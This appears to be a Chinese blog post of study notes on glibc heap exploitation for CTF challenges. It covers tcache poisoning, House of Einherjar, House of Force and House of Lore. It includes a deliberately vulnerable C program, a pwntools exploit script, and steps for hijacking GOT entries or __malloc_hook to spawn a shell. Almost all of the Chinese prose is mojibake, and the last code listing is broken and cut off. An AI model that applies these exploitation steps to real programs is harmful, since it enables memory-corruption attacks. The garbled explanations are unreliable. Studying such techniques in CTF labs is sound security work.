<p>æ¯”å¦‚è¦ä»¤magic&gt;æŸä¸€å€¼ï¼Œè€Œmain_arenaå¤§äºè¯¥å€¼ï¼Œæ­¤æ—¶åªéœ€è®©é‡Šæ”¾çš„chunkçš„bkæŒ‡å‘&amp;magic-0x10ï¼Œæ­¤æ—¶unsortedbinå‘ç”Ÿcorrupted,ç”±å…ˆè¿›å…ˆå‡ºåŸåˆ™ï¼Œå†æ¬¡ç”³è¯·å°±å˜æˆ&amp;magic-0x10æŒ‡å‘çš„chunkçš„fdæŒ‡å‘main_arena,è€Œå…¶fdåœ°å€å³ä¸º&amp;magic</p>
<p>æ”¹å‰ï¼šcorruptedå¯åŠ¨<img src="/linux%E7%94%A8%E6%88%B7%E5%B1%82pwn/1752594296767.png" alt="1752594296767"></p>
<p>æ”¹åï¼š<img src="/linux%E7%94%A8%E6%88%B7%E5%B1%82pwn/1752594313748.png" alt="1752594313748"></p>
<h4 id="largebin-attack"><a href="#largebin-attack" class="headerlink" title="largebin attack"></a>largebin attack</h4><p>largebinå…±æœ‰63ä¸ªbinï¼Œåˆ†æˆå…­ç»„ï¼Œæ¯ç»„sizeå…¬å·®ä¸€è‡´ï¼Œå¤§äº512å­—èŠ‚çš„ä¸ºlarge bin</p>
<p><strong>ä¸å…¶ä»–binåŒºåˆ«</strong></p>
<p>fd_nextsizeæŒ‡å‘å‰ä¸€ä¸ªä¸å½“å‰chunkå¤§å°ä¸åŒçš„ç¬¬ä¸€ä¸ªç©ºé—²å—ï¼Œä¸åŒ…å«binçš„å¤´æŒ‡é’ˆ</p>
<p>bk_nextsizeæŒ‡å‘åä¸€ä¸ªä¸å½“å‰chunkå¤§å°ä¸åŒçš„ç¬¬ä¸€ä¸ªç©ºé—²å—ï¼Œä¸åŒ…å«binçš„å¤´æŒ‡é’ˆ</p>
<p><strong>ï¼ï¼</strong></p>
<p> ä¸€èˆ¬ç©ºé—²çš„large chunkåœ¨fdçš„éå†é¡ºåºä¸­ï¼ŒæŒ‰ç…§ç”±å¤§åˆ°å°çš„é¡ºåºæ’åˆ— ã€‚</p>
<p> å¤šä¸ªå¤§å°ç›¸åŒçš„å †å—ï¼Œåªæœ‰é¦–å †å—çš„fd_nextsizeå’Œbk_nextsizeä¼šæŒ‡å‘å…¶ä»–å †å—ï¼Œåé¢çš„å †å—çš„fd_nextsizeå’Œbk_nextsizeå‡ä¸º0 ã€‚</p>
<p> sizeæœ€å¤§çš„chunkçš„bk_nextsizeæŒ‡å‘æœ€å°çš„chunkï¼Œsizeæœ€å°çš„chunkçš„fd_nextsizeæŒ‡å‘æœ€å¤§çš„chunk </p>
<p><strong>åˆ©ç”¨ï¼š</strong></p>
<p> <img src="/linux%E7%94%A8%E6%88%B7%E5%B1%82pwn/2e651bd51e0efe0a4da92de944f63713.png" alt="img"> </p>
<p>P2æ˜¯ä¸€ä¸ªlargebinï¼Œå°†ä»–æŒ‚è¿›largeä¸­ï¼Œå¦‚ä½•æŒ‚è¿›çœ‹unsortedbinæœºåˆ¶ï¼ŒæŒ‚å®Œåå°†å…¶bkå’Œbk_nextsizeè®¾ä¸ºå›¾ä¸­æ‰€ç¤ºç»“æ„ï¼Œæ­¤æ—¶è‹¥å†æ¬¡æŒ‚è¿›ä¸€ä¸ªsizeå¤§äºP2sizeçš„chunkP3ï¼Œå°±ä¼šå°†stack_var2å’Œstack_var1çš„å€¼æŒ‡å‘P3ï¼Œæ‰€ä»¥ä¹Ÿå¯ä»¥è¾¾åˆ°ä¿®æ”¹æ•°å€¼çš„æ•ˆæœã€‚</p>
<h4 id="tcacheåŸºç¡€"><a href="#tcacheåŸºç¡€" class="headerlink" title="tcacheåŸºç¡€"></a><strong>tcacheåŸºç¡€</strong></h4><p>glibc 2.26å¼•å…¥çš„ï¼Œæ‰€ä»¥åº”å…ˆæ£€æŸ¥æ–‡ä»¶glibcç‰ˆæœ¬ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">strings libc.so.6 | grep -i &#x27;version&#x27;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ç»“æ„ï¼š <code>tcache_entry</code>å’Œ<code>tcache_perthread_struct</code> ï¼Œå‰è€…æ˜¯ç”¨æ¥é“¾æ¥ç©ºé—²çš„chunk(æœ€å¤šä¸€æ¡é“¾æœ‰ä¸ƒä¸ª)ï¼Œå…¶nextæ˜¯æŒ‡å‘ä¸å…¶å¤§å°ä¸€è‡´çš„chunk(ä¸fdæœ‰ç‚¹åƒ)ï¼›<code>tcache_perthread_struct</code>ç”±countså’Œ <code>tcache_entry</code>ç»„æˆï¼Œç”¨æ¥ç®¡ç†ä¸€ä¸ªtcacheé“¾ã€‚</p>
<p><strong>tcacheä½¿ç”¨</strong></p>
<p>tcacheæ‰§è¡Œæµç¨‹å¦‚ä¸‹ï¼š</p>
<p>â€‹        ç¬¬ä¸€æ¬¡mallocæ—¶ï¼Œä¼šç”³è¯·ä¸€å—å†…å­˜å­˜æ”¾tcache_perthread_structï¼Œè¿™å—å†…å­˜sizeä¸€èˆ¬ä¸º0x251<br>â€‹        é‡Šæ”¾chunkæ—¶ï¼Œtcacheæ²¡å¡«æ»¡éƒ½ä¼˜å…ˆè¿›å…¥tcachebin<br>â€‹        åœ¨æ”¾å…¥tcacheåï¼šå…ˆæ”¾åˆ°å¯¹åº”çš„tcacheä¸­ï¼Œç›´åˆ°tcacheè¢«å¡«æ»¡ï¼ˆ7ä¸ªï¼‰;tcacheè¢«å¡«æ»¡åï¼Œæ¥ä¸‹æ¥å†é‡Šæ”¾chunkï¼Œå°±ä¼šç›´æ¥æ”¾è¿›fastbinæˆ–è€…unsorted binä¸­;tcacheä¸­çš„chunkä¸ä¼šå‘ç”Ÿåˆå¹¶ï¼Œä¸å–æ¶ˆinuse bitï¼ˆæœªå°†Pä½æ”¹ä¸º0ï¼‰<br>â€‹        é‡æ–°ç”³è¯·chunkï¼Œå¹¶ä¸”ç”³è¯·çš„sizeç¬¦åˆtcacheçš„èŒƒå›´ï¼Œåˆ™å…ˆä»tcacheä¸­å–chunkï¼Œç›´åˆ°tcacheä¸ºç©º<br>tcacheä¸ºç©ºåï¼Œä»binä¸­æ‰¾<br>â€‹        tcacheä¸ºå…¨ç©ºæ—¶ï¼Œå¦‚æœfastbinã€small binã€unsorted binä¸­æœ‰sizeç¬¦åˆçš„chunkï¼Œä¼šå…ˆæŠŠfastbinã€small binã€unsorted binä¸­çš„chunkæ”¾åˆ°tcacheä¸­ï¼Œç›´åˆ°å¡«æ»¡ï¼Œä¹‹åå†ä»tcacheä¸­å–<br>â€‹        éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œåœ¨é‡‡ç”¨tcacheçš„æƒ…å†µä¸‹ï¼Œåªè¦æ˜¯binä¸­å­˜åœ¨ç¬¦åˆsizeå¤§å°çš„chunkï¼Œé‚£ä¹ˆåœ¨é‡å¯ä¹‹å‰éƒ½éœ€è¦ç»è¿‡tcacheä¸€æ‰‹ã€‚å¹¶ä¸”ç”±äºtcacheä¸ºç©ºæ—¶å…ˆä»å…¶ä»–binä¸­å¯¼å…¥åˆ°tcacheï¼Œæ‰€ä»¥æ­¤æ—¶chunkåœ¨binä¸­å’Œåœ¨tcacheä¸­çš„é¡ºåºä¼šåè¿‡æ¥</p>
<p><strong>tcacheå†…å­˜ç”³è¯·ï¼š</strong></p>
<p> tcache-&gt;entriesä¸ä¸ºç©ºæ—¶è°ƒç”¨<code>tcache_get()</code>å‡½æ•°è·å–chunkã€‚ </p>
<p><strong>tcache_get()</strong></p>
<p> ä»<code>tcache-&gt;entries[tc_idx]</code>è·å–ä¸€ä¸ªchunkæŒ‡é’ˆï¼Œå¹¶ä¸”<code>tcache-&gt;counts</code>å‡ä¸€ï¼Œ.</p>
<p><strong>å†…å­˜é‡Šæ”¾ï¼š</strong></p>
<p>é€šè¿‡tcache_put()å‡½æ•°æ”¾å…¥ï¼Œè¯¥å‡½æ•°ç›´æ¥å°†chunkæ”¾å…¥å…¶å¤´éƒ¨(LIFO)</p>
<h4 id="tcache-attack"><a href="#tcache-attack" class="headerlink" title="tcache attack"></a>tcache attack</h4><p><strong>tcache poisoning</strong>ï¼ˆå•é“¾è¡¨ï¼‰</p>
<p>æ‰‹æ®µï¼šè¦†ç›–tcacheçš„nextæˆå‘˜å˜é‡ï¼Œå°±æ˜¯å°†ç”³è¯·çš„ä¸¤ä¸ªchunk a,bé‡Šæ”¾è¿›tcacheä¸­ï¼Œæ­¤æ—¶é€šè¿‡å †æº¢å‡ºå°†bçš„fdè¦†å†™ä¸º&amp;targetï¼Œç„¶åtcachebinsç»“æ„å°±ç”±b-&gt;aå˜ä¸ºb-&gt;&amp;target,æ­¤æ—¶è¿ç»­ç”³è¯·ä¸¤æ¬¡å³å¯ã€‚</p>
<p>è¿™æ—¶å€™å¦‚æœtargetä¸ºmalloc_hook-0x10çš„ä½ç½®ï¼Œé‚£ä¹ˆç›´æ¥æŒ‚ä¸Šé’©å­å°±å¯ä»¥äº†</p>
<p><strong>tcache double free</strong></p>
<p>æ¯”fastbinè¿˜ç®€å•ï¼Œä»€ä¹ˆéƒ½ä¸æ£€æŸ¥ï¼Œç›´æ¥è¿ç»­ä¸¤æ¬¡free</p>
<p><strong>tcache house of spirit</strong></p>
<p>ç›´æ¥å°†ä¸€ä¸ªæŒ‡é’ˆå˜é‡æŒ‡å‘fake_chunkçš„dateåŒºå¹¶é‡Šæ”¾ï¼Œæ­¤æ—¶ä¼šå°†å…¶æ”¾å…¥tcacheä¸­ï¼Œå†æ¬¡ç”³è¯·ï¼Œå°±ä¼šå°†å…¶å–å‡º</p>
<p><strong>å®ä¾‹ï¼š</strong></p>
<p>ç›´æ¥å°†å­˜æ”¾chunkçš„æŒ‡é’ˆæŒ‡å‘æŸä¸€ä¸å¯ç¼–è¾‘ä½†å¾ˆé‡è¦çš„chunkï¼Œé‡Šæ”¾å†ç”³è¯·ï¼Œå°±å¯ä»¥ç¼–è¾‘è¯¥chunkã€</p>
<p><strong>tcache stashing unlink attack</strong></p>
<p>**æœºåˆ¶ï¼š**åªä¼šæ£€æŸ¥bkå­—æ®µ</p>
<p>mallocç”³è¯·ä¼šä»tcachebinså¼€å§‹ï¼Œè€Œcallocä¼šè·³è¿‡tcacheï¼Œç›´æ¥ä»å¯¹åº”binsä¸­æ‹¿ï¼Œè€Œæ­¤æ—¶è‹¥smallbinsä¸­æœ‰ç¬¦åˆå¤§å°çš„chunk(bk :a-&gt;b-&gt;c-&gt;d-&gt;â€¦ï¼Œé‚£ä¼šç›´æ¥ä»å…¶ä¸­æ‹¿aï¼Œå¹¶åªæ£€éªŒbæ˜¯å¦ç¬¦åˆï¼Œè‹¥ç¬¦åˆï¼Œå°±ç›´æ¥å…¨éƒ¨æ”¾å…¥tcacheä¸­ã€‚æ­¤æ—¶è‹¥tcacheä¸­å‰©ä½™ä¸¤ä¸ªç©ºä½ï¼Œé‚£ä¹ˆå°†b-&gt;bkæ”¹ä¸º&amp;targetï¼Œé‚£ä¹ˆtcacheå°±å˜æˆ&amp;target-&gt;b-&gt;â€¦,æ­¤æ—¶ç”³è¯·å°±å¯ä»¥å¾—åˆ°&amp;targetçš„chunkï¼Œä»è€Œå¾—åˆ°ä»»æ„ä¿®æ”¹å€¼çš„ä½œç”¨ã€‚</p>
<p>tcacheçš„chunk-&gt;fdæ˜¯nextå­—æ®µ chunk-&gt;bkæ˜¯keyå­—æ®µ</p>
<p>è‡ªglibc 2.29ï¼Œkeyå­—æ®µæŒ‡å‘tcache_perthread_struct,æ£€æŸ¥keyå­—æ®µæ˜¯å¦æŒ‡å‘æœ¬èº«ï¼Œè¿™æ ·å°±é˜²æ­¢äº†double freeï¼›ä½†ä¸èƒ½é¿å…uafæ¼æ´å’Œtcache poisoningï¼›</p>
<p>ä½†glibc 2.34 æ— æ³•é€šè¿‡<code>key</code>å­—æ®µæ³„éœ²å †åœ°å€ </p>
<h4 id="è§¦å‘shellæŠ€å·§ï¼š"><a href="#è§¦å‘shellæŠ€å·§ï¼š" class="headerlink" title="è§¦å‘shellæŠ€å·§ï¼š"></a>è§¦å‘shellæŠ€å·§ï¼š</h4><p>111111111111</p>
<p>å¾—åˆ°èƒ½å¤Ÿç¼–è¾‘å­˜å‚¨chunkæŒ‡é’ˆçš„ä½ç½®ï¼Œå¦‚<img src="C:\Users\shizihang\AppData\Roaming\Typora\typora-user-images\1752335838347.png" alt="1752335838347"></p>
<p>å›¾ä¸­0x602140å¼€å§‹æ—¶å­˜å‚¨æŒ‡å‘chunk dateåŒºåŸŸçš„åœ°å€ï¼Œé€šè¿‡æŸç§æ–¹å¼å¦‚unlinkä½¿å¾—ç¼–è¾‘è¯¥æ®µï¼Œå°†firstchunkæ”¹ä¸ºfreeåœ°å€ï¼Œsecondchunkæ”¹ä¸ºputsåœ°å€ï¼Œthirdchunkæ”¹ä¸ºatoiåœ°å€ï¼Œæ­¤æ—¶ä¿®æ”¹chunk1æ”¹çš„å°±æ˜¯freeçš„å†…å®¹ï¼ˆå‡ä¸ºgotæ ‡ä½ç½®ï¼‰ï¼Œè‹¥å°†å…¶æ”¹ä¸ºputs_pltï¼Œæ­¤æ—¶freeæ•ˆæœå°±å˜ä¸ºputsï¼Œfree(secondchunk)å˜ä¸ºputs(secondchunk)ä¹Ÿå°±æ˜¯puts(puts_got)ï¼Œæ­¤æ—¶å°±å¯ä»¥å°†atoiæ”¹ä¸ºsystemï¼Œå› ä¸ºatoiä¸ºå‘é€å­—ç¬¦å³å¯è§¦å‘ï¼Œæ­¤æ—¶å‘é€&#x2F;bin&#x2F;shåœ°å€å³å¯</p>
<p>222222222222</p>
<p>æŒ‚é’©å­ï¼šæ‰¾å‡ºé’©å­ï¼š one_gadget .&#x2F;libc.so.6 </p>
<p>å¾—åˆ°çš„é’©å­åœ°å€è¦åŠ ä¸Šlibc_baseï¼Œå°†å…¶å†™å…¥_malloc_hookä¸­ï¼Œæ­¤æ—¶mallocå³å¯è§¦å‘</p>
<p>ä¹Ÿå¯èƒ½éœ€è¦ç”¨åˆ°reallocï¼Œå³åœ¨_mlloc_hook-0x8çš„åœ°å€ä¸Šå†™å…¥gadgetï¼Œåœ¨__malloc_hookå¤„å†™ä¸Šreallocçš„åœ°å€ã€‚realloc_addr&#x3D;libc_base+libc.sym[â€œreallocâ€]</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/mcmuyanga/article/details/111307531?fromshare=blogdetail&sharetype=blogdetail&sharerId=111307531&sharerefer=PC&sharesource=2403_88369859&sharefrom=from_link">https://blog.csdn.net/mcmuyanga/article/details/111307531?fromshare=blogdetail&amp;sharetype=blogdetail&amp;sharerId=111307531&amp;sharerefer=PC&amp;sharesource=2403_88369859&amp;sharefrom=from_link</a></p>
<p>33333333333</p>
<p>è‹¥gotè¡¨ä¸­æœ‰strlençš„åœ°å€ï¼Œé‚£ä¹ˆå°†å…¶æ‰€æŒ‡å‘å†…å®¹æ”¹ä¸ºsystemï¼Œé‚£ä¹ˆå‘é€â€œ ;&#x2F;bin&#x2F;sh\x00â€å°±ä¼šè¢«strlen()å‡½æ•°è®¡æ•°ï¼Œstrlen(&#x2F;bin&#x2F;sh) &#x3D;system(â€œ&#x2F;bin&#x2F;shâ€)ï¼Œæ³¨æ„ä¸atoi()å‡½æ•°åŒºåˆ«</p>
<p>ç¨‹åºå¼€å¯pieä¿æŠ¤ï¼Œæ‰€ä»¥è¦å…ˆé€šè¿‡unsortedbinè·å¾—libc_base,é€šå¸¸unsortedbinæŒ‡å‘main_arena+0x58ï¼Œä¸libcåç§»ä½0x3c4b78</p>
<p>4444444444444</p>
<ul>
<li>æœªæ¸…ç©ºæŒ‡é’ˆï¼Œé¦–å…ˆè€ƒè™‘UAFã€double free</li>
<li>åˆ©ç”¨unsorted binè·å–libcåŸºå€</li>
<li>åˆ©ç”¨double freeå°†chunké‡ŒæŒ‡å‘name chunkæŒ‡é’ˆä¿®æ”¹æˆæŒ‡å‘free_hook</li>
<li>ä¿®æ”¹free_hookä¸ºsystem@got</li>
<li>æ‰§è¡Œfreeå³æ˜¯æ‰§è¡Œsystem</li>
</ul>
<h2 id="å †é¢å¤–æŠ€æœ¯"><a href="#å †é¢å¤–æŠ€æœ¯" class="headerlink" title="å †é¢å¤–æŠ€æœ¯"></a>å †é¢å¤–æŠ€æœ¯</h2><h4 id="House-of-Einherjar"><a href="#House-of-Einherjar" class="headerlink" title="House of Einherjar"></a>House of Einherjar</h4><p><strong>æ¶‰åŠfreeå‡½æ•°çš„åå‘åˆå¹¶ï¼š</strong></p>
<p>chunkä¸­sizeä½éœ€ä¸º0</p>
<p><img src="/linux%E7%94%A8%E6%88%B7%E5%B1%82pwn/1748005168474.png" alt="1748005168474"></p>
<p>å¹¶ä¸”freeåä¼šä¸top chunkåˆå¹¶</p>
<p>gcc -fno-stack-protector -no-pie 1.c -o sssè®¾ä¸ºpwnæ–‡ä»¶</p>
<p><img src="/linux%E7%94%A8%E6%88%B7%E5%B1%82pwn/1748008680383.png" alt="1748008680383"></p>
<p><strong>ä¸¾ä¾‹</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">`#include &lt;stdio.h&gt;`</span><br><span class="line">`#include &lt;stdlib.h&gt;`</span><br><span class="line">`#include &lt;unistd.h&gt;`</span><br><span class="line"></span><br><span class="line">`int main(void)&#123;`</span><br><span class="line">    `char* s0 = malloc(0x200);//æ„é€ fake chunk`</span><br><span class="line">    `char* s1 = malloc(0x18);`</span><br><span class="line">    `char* s2 = malloc(0xf0);`</span><br><span class="line">    `char* s3 = malloc(0x20);//ä¸ºäº†ä¸è®©s2ä¸top chunk åˆå¹¶`</span><br><span class="line">    `printf(&quot;begin\n&quot;);`</span><br><span class="line">    `printf(&quot;%p\n&quot;, s0);`</span><br><span class="line">    `printf(&quot;input s0\n&quot;);`</span><br><span class="line">    `read(0, s0, 0x200);//è¯»å…¥fake chunk`</span><br><span class="line">    `printf(&quot;input s1\n&quot;);`</span><br><span class="line">    `read(0, s1, 0x19);//Off By One`</span><br><span class="line">    `free(s2);`</span><br><span class="line">    `return 0;`</span><br><span class="line">`&#125;`</span><br><span class="line"></span><br><span class="line">expï¼š</span><br><span class="line"></span><br><span class="line">`from pwn import *`</span><br><span class="line"></span><br><span class="line">`p = process(&quot;./sss&quot;)`</span><br><span class="line">`context.log_level = &#x27;debug&#x27;`</span><br><span class="line">`#gdb.attach(p)`</span><br><span class="line">`p.recvuntil(b&quot;0x&quot;)`</span><br><span class="line">`address = int(p.recv(8), 16)`</span><br><span class="line">`p.recvuntil(b&quot;input s0\n&quot;)`</span><br><span class="line">`payload = p64(0) + p64(0x221) + p64(address) * 2 + b&quot;A&quot;*0xe0</span><br><span class="line">payload += p64(0x100) #fake size</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(b&quot;input s1\n&quot;)</span><br><span class="line">payload = b&quot;A&quot;*0x10 + p64(0x220) + b&quot;\x00&quot;`</span><br><span class="line">`p.sendline(payload)`</span><br><span class="line">`p.recvall()`</span><br><span class="line">`p.close()`</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p><strong>æ€»ç»“ï¼š</strong></p>
<p>å…ˆè®¾ç½®chunk1ï¼Œ2ï¼Œ3ï¼Œç„¶åå¯é€šè¿‡è¾“å…¥chunk1çš„å†…å®¹ä½¿å¾—åœ¨chunk1çš„dateåŸŸè®¾ç½®ä¸€ä¸ªå‡chunkï¼Œååˆ©ç”¨chun2ï¼ˆ0x18ï¼Œä»¥8ç»“å°¾ï¼Œè¿™æ ·æ‰èƒ½off-by-oneåˆ°chunk3çš„sizeä½ï¼‰è¿›è¡Œoff-by-oneï¼Œå¹¶ä¸”åœ¨è¯¥payloadä¸­å°†å…¶pre-sizeä½è®¾ä¸ºå‡chunkçš„sizeã€‚p64(address) * 2æ˜¯ä¸ºäº†é€šè¿‡unlinkæ£€æŸ¥ã€‚</p>
<p>ï¼ˆ1ï¼‰éœ€è¦æœ‰æº¢å‡ºæ¼æ´å¯ä»¥å†™ç‰©ç†ç›¸é‚»çš„é«˜åœ°å€çš„ prev_size ä¸ PREV_INUSE éƒ¨åˆ†ã€‚</p>
<p>ï¼ˆ2ï¼‰æˆ‘ä»¬éœ€è¦è®¡ç®—ç›®çš„ chunk ä¸ p1 åœ°å€ä¹‹é—´çš„å·®ï¼Œæ‰€ä»¥éœ€è¦æ³„æ¼åœ°å€ã€‚</p>
<p>ï¼ˆ3ï¼‰æˆ‘ä»¬éœ€è¦åœ¨ç›®çš„ chunk é™„è¿‘æ„é€ ç›¸åº”çš„ fake chunkï¼Œä»è€Œç»•è¿‡ unlink çš„æ£€æµ‹ã€‚</p>
<h4 id="House-of-Forceï¼ˆtop-chunkæ“ä½œï¼‰"><a href="#House-of-Forceï¼ˆtop-chunkæ“ä½œï¼‰" class="headerlink" title="House of Forceï¼ˆtop chunkæ“ä½œï¼‰"></a>House of Forceï¼ˆtop chunkæ“ä½œï¼‰</h4><p><strong>æ¡ä»¶ï¼š</strong></p>
<p>â€‹           1.èƒ½å¤Ÿä»¥æº¢å‡ºç­‰å½¢å¼æ§åˆ¶top chunkçš„sizeåŸŸ</p>
<p>â€‹            2.èƒ½å¤Ÿè‡ªç”±åˆ†é…å †å°ºå¯¸çš„å¤§å°(å¾ˆå¤§çš„size)</p>
<p><strong>æˆæœï¼š</strong></p>
<p>â€‹             å¯ä»¥ä½¿å¾— top chunk æŒ‡å‘æˆ‘ä»¬æœŸæœ›çš„ä»»ä½•ä½ç½®ï¼Œè¿™å°±ç›¸å½“äºä¸€æ¬¡ä»»æ„åœ°å€å†™ </p>
<p><strong>åˆ©ç”¨ï¼š</strong></p>
<p>æœ‰çš„é¢˜ç›®ç”³è¯·äº†ä¼šè¾“å‡ºç”³è¯·çš„ä½ç½®ï¼Œé‚£ä¹ˆè¿™æ—¶å€™å¯ä»¥è·å¾—libc_base,å› ä¸ºç”³è¯·å¤§å¤§å †ä¼šé€šè¿‡mmapï¼Œå…¶ä¸libcçš„åç§»å›ºå®šï¼Œå› æ­¤vmmapçœ‹libcä½ç½®ï¼Œç›¸å‡å°±å¾—åˆ°äº†å›ºå®šåç§»</p>
<p><strong>ä¾‹å­1</strong></p>
<p>  ä¸€èˆ¬æ˜¯æŠŠtop chunkæ”¹ä¸º-1</p>
<p><img src="/linux%E7%94%A8%E6%88%B7%E5%B1%82pwn/1748607027690.png" alt="1748607027690"></p>
<p>é€šè¿‡ä¿®æ”¹top chunkçš„æŒ‡é’ˆåˆ°mallocä½ç½®é™„è¿‘ï¼Œä»è€Œä½¿ä¸‹ä¸€æ¬¡åˆ†é…chunkæ—¶å«æœ‰mallocåœ°å€</p>
<p><img src="/linux%E7%94%A8%E6%88%B7%E5%B1%82pwn/1748607245941.png" alt="1748607245941"></p>
<p><img src="/linux%E7%94%A8%E6%88%B7%E5%B1%82pwn/1748607224106.png" alt="1748607224106"></p>
<p> 0x601010-0x602020&#x3D;-4112 </p>
<p>ç»“æœï¼š</p>
<p><img src="/linux%E7%94%A8%E6%88%B7%E5%B1%82pwn/1748607282541.png" alt="1748607282541"></p>
<p><strong>ä¾‹å­2</strong></p>
<p><img src="/linux%E7%94%A8%E6%88%B7%E5%B1%82pwn/1748607513068.png" alt="1748607513068"></p>
<p>é¦–å…ˆï¼Œç”±è°ƒè¯•å¾—çŸ¥ __malloc_hook çš„åœ°å€ä½äº 0x7ffff7dd1b10 ï¼Œé‡‡å–è®¡ç®—</p>
<p>0x7ffff7dd1b00-0x602020-0x10&#x3D;140737345551056 ç»è¿‡è¿™æ¬¡ malloc ä¹‹åï¼Œæˆ‘ä»¬å¯ä»¥è§‚å¯Ÿåˆ° top chunk çš„åœ°å€è¢«æŠ¬é«˜åˆ°äº† 0x00007ffff7dd1b00</p>
<p><img src="/linux%E7%94%A8%E6%88%B7%E5%B1%82pwn/1748607662973.png" alt="1748607662973"></p>
<h4 id="House-of-Lore-small-bin"><a href="#House-of-Lore-small-bin" class="headerlink" title="House of Lore(small bin)"></a>House of Lore(small bin)</h4><p><strong>small binæœºåˆ¶</strong></p>
<blockquote>
<ul>
<li><strong>mallocï¼ˆsmall chunkï¼‰æ“ä½œ</strong>ï¼šæœ€åˆå…ˆç”± unsorted bin å¤„ç†ï¼Œå¦‚æœ unsorted bin å¤„ç†ä¸äº†ï¼Œglibc malloc å°±ä»¥æ­¤éå†åç»­çš„æ‰€æœ‰ binsï¼Œæ‰¾å‡ºç¬¬ä¸€ä¸ªæ»¡è¶³è¦æ±‚çš„ binï¼Œå¦‚æœæ‰€æœ‰çš„ bin éƒ½ä¸èƒ½æ»¡è¶³çš„è¯ï¼Œå°±è½¬è€Œä½¿ç”¨ top chunkï¼Œå¦‚æœ top chunk å¤§å°ä¸å¤Ÿï¼Œé‚£ä¹ˆå°±æ‰©å®¹ top chunkã€‚å½“å†æ¬¡è°ƒç”¨ malloc (small chunk) çš„æ—¶å€™ï¼Œå¦‚æœè¯¥ chunk size å¯¹åº”çš„ small bin ä¸ä¸ºç©ºï¼Œå°±ä»è¯¥ small bin é“¾è¡¨ä¸­å–å¾— small chunkï¼Œå¦åˆ™å°±éœ€è¦äº¤ç»™ unsorted bin åŠä¹‹åçš„é€»è¾‘æ¥å¤„ç†ã€‚</li>
<li><strong>free (small chunk) æ“ä½œ</strong>ï¼šå½“é‡Šæ”¾ small chunk çš„æ—¶å€™ï¼Œå…ˆæ£€æŸ¥è¯¥ chunk ç›¸é‚»çš„ chunk æ˜¯å¦ä¸º freeï¼Œå¦‚æœæ˜¯çš„è¯å°±è¿›è¡Œåˆå¹¶æ“ä½œï¼Œå°†è¿™äº› chunks åˆå¹¶æˆæ–°çš„ chunkï¼Œç„¶åå°†ä»–ä»¬ä» small bin ä¸­ç§»é™¤ï¼Œæœ€åå°†æ–°çš„ chunk æ·»åŠ åˆ° unsorted bin ä¸­ã€‚</li>
</ul>
</blockquote>
<p>small binä¸ºåŒé“¾è¡¨ï¼Œå…ˆè¿›å…ˆå‡ºï¼Œæ‰€ä»¥é€šè¿‡æ”¹å…¶bkä½¿å¾— small bin çš„ bk æ°å¥½ä¸ºæˆ‘ä»¬æ„é€ çš„ fake chunkã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå½“ä¸‹ä¸€æ¬¡ç”³è¯· small bin çš„æ—¶å€™ï¼Œæˆ‘ä»¬å°±ä¼šåˆ†é…åˆ°æŒ‡å®šä½ç½®çš„ fake chunkã€‚ </p>
<p><strong>ä¸¾ä¾‹ï¼š</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"> #include &lt;stdio.h&gt; </span><br><span class="line"> #include &lt;stdlib.h&gt; </span><br><span class="line"> #include &lt;string.h&gt; </span><br><span class="line"> #include &lt;stdint.h&gt; </span><br><span class="line"> void jackpot()&#123; </span><br><span class="line">     puts(&quot;Nice jump d00d&quot;); </span><br><span class="line">     exit(0); &#125; </span><br><span class="line"></span><br><span class="line"> intptr_t *victim = malloc(100);` </span><br><span class="line">`intptr_t *victim_chunk = victim-2;` </span><br><span class="line">`stack_buffer_1[0] = 0;` </span><br><span class="line">`stack_buffer_1[1] = 0;  </span><br><span class="line"> stack_buffer_1[2]=victim_chunk;` </span><br><span class="line">`stack_buffer_1[3] = (intptr_t*)stack_buffer_2;  </span><br><span class="line"> stack_buffer_2[2] = (intptr_t*)stack_buffer_1;` </span><br><span class="line"> void *p5 = malloc(1000);` é˜²æ­¢ä¸topchunkåˆå¹¶</span><br><span class="line"> free((void*)victim);` </span><br><span class="line"> void *p2 = malloc(1200);` æ— æ³•ä»binä¸­åˆ†é…å‡º1200å¤§å°chunkï¼Œæ‰€ä»¥unsorted binä¸­çš„victimè·‘åˆ°å¯¹åº”å¤§  å°binä¸­ï¼ˆsmallï¼‰</span><br><span class="line"> victim[1] = (intptr_t)stack_buffer_1; // victim-&gt;bk is pointing to stack` </span><br><span class="line"> void *p3 = malloc(100);` </span><br><span class="line"> char *p4 = malloc(100);` </span><br><span class="line"> intptr_t sc = (intptr_t)jackpot; // Emulating our in-memory shellcode`  </span><br><span class="line"> memcpy((p4+40), &amp;sc, 8); // This bypasses stack-smash detection since it jumps over the canary` 